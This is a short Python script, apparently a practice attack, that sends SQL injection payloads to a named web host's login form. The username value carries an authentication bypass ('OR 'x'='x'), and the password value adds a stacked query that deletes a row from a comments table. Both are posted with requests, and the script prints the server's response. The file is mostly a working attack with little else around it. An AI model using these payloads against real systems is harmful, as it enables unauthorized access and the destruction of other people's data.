import mysql.connector

print('ahoj')
usernameField = 'anything\' OR \'x\'=\'x'
passwordField = 'anything\' OR \'x\'=\'x\'; DELETE FROM comments WHERE id = \'1\'; --'

from twill.commands import *
print(usernameField)
print(passwordField)
import requests
url = 'http://apache1.willilazarov.cz/'
values = {'username': usernameField ,
          'password': passwordField }

r = requests.post(url, data=values)
print(r.content)
